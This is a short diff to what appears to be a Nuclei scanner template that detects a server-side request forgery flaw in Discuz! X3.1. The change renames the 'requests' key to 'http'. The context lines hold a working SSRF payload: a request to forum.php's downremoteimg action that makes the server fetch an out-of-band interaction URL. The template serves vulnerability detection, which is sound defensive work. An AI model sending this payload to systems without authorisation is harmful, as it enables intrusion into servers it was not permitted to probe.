@@ -15,7 +15,7 @@ info:
     hunter-query: web.body="Discuz! X3.1"
   tags: discuz,ssrf,oast
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/forum.php?mod=ajax&action=downremoteimg&message=[img]http://{{interactsh-url}}/test?.jpg[/img]"
